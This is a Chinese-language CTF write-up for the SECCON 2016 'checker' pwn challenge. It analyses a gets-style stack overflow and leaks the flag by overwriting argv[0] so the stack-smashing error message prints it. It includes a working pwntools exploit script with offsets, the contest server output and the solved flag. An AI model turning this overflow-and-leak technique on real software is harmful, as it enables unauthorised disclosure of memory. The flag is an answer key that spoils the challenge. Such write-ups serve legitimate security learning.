---
title: '[SECCON CTF 2016 Quals] checker 300'
author: bruce30262
tags:
  - pwn
  - buffer overflow
  - SECCON CTF 2016
  - stack overflow
categories:
  - write-ups
date: 2016-12-15 22:02:00
---
## Info  
> Category: pwn
> Point: 300
> Author: bruce30262 @ BambooFox


## Analyzing
64 bit ELF, Full RELRO, 有 stack canary 和 NX , 沒 PIE.

程式很小，行為也很簡單:

```
$ ./checker 
Hello! What is your name?
NAME : 123

Do you know flag?
>> 123

Do you know flag?
>> yes

Oh, Really??
Please tell me the flag!
FLAG : asdf
You are a liar...
```
簡單來說就是程式會讀我們的 input，然後比對 flag 內容 ( 正確的 flag 內容會存在 `.bss` section )，之後印出比對的結果。

程式使用自製的函式 `getaline()` 來讀 user 的 input

```c getaline
while ( buf && read(0, &buf, 1uLL) )
{
    if ( buf == 10 )
      buf = 0;
    *(_BYTE *)(a1 + (signed int)v4++) = buf; // a1 = input buffer
}
```

可以看到 `getaline()` 就跟 `stdio.h` 裡面的 `gets()` 一樣，除非讀到換行，否則會一直讀下去，因此這是一個很明顯的 buffer overflow 漏洞。

```
$ ./checker
Hello! What is your name?
NAME : 123

Do you know flag?
>> yes

Oh, Really??
Please tell me the flag!
FLAG : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You are a liar...
*** stack smashing detected ***: ./checker terminated
[1]    70548 abort      ./checker
```

## Exploit

一開始想嘗試直接蓋 return address，但是因為有 canary 的關係使得這很難做到。直到看到程式印出 stack smash 的 error message 時，才突然想起可以直接蓋 `argv[0]`，將指向執行檔路徑的 char* pointer 改成存 flag 的 buffer address，之後觸發 `stack_chk_fail`，使程式印出 error message，進而 leak 出 flag 的內容:
```
*** stack smashing detected ***: [flag content] terminated
```

這邊要注意的是 `argv[0]` 原本是一個 stack address，長度為 6 個 byte，而 flag 的 buffer address 位於 `0x6010c0`，長度為 3 個 byte，因此在蓋 `argv[0]` 之前要先將 `argv[0]` 作清空的動作，否則之後印 error message 時會 crash 掉。

```python exp_checker.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "checker.pwn.seccon.jp"
PORT = 14726
ELF_PATH = "./checker"
LIBC_PATH = ""

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

context.log_level = 'INFO'

elf = ELF(ELF_PATH)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    pad = 0x178

    r.sendlineafter(": ", "aaaa")
    
    # null out argv[0]
    for i in xrange(8,-1,-1):
        payload = "A"*pad + "B"*i
        r.sendlineafter(">> ", payload)
    
    r.sendlineafter(">> ", "yes")

    # overwrite argv[0] to flag buffer
    payload = "A"*pad + p64(0x6010c0)
    r.sendlineafter(": ", payload)
	
    r.interactive()

```

exploit 在本地端可以 work，但是之後送 remote 端時卻一直沒噴回 flag。本來以為是 padding 的問題，但是在做了一些測試之後斷定 padding 是正確的，input buffer 離 `argv[0]` 就是 376 個 byte。因此之後就是瘋狂的鬼打牆，不斷地送同樣的 payload 到 remote 端並祈禱 exploit 能夠 work。然後就在比賽結束前 3 分鐘，奇蹟發生了...
```
[+] Opening connection to checker.pwn.seccon.jp on port 14726: Done
You are a liar...
*** stack smashing detected ***: SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4} terminated
[*] Got EOF while reading in interactive
```

完全無法理解 XDDD ( 明明是一模一樣的 payload 啊 ! )
而且在這之後不管怎麼送就是不會 work，非常詭異

無論如何還是驚險地拿到了這 300 分 =w=

flag: `SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4}`


## Afterword 
之後 **mike** 在 trello 上有提到，如果 `0x6010c0` 是在回答 yes 之前蓋的話就會 work。或是把 `sendlineafter()` 改成 `sendline()`，之後一次 `recvall()` 也會噴回 flag。
至於詳細原因為何至今仍然無解......
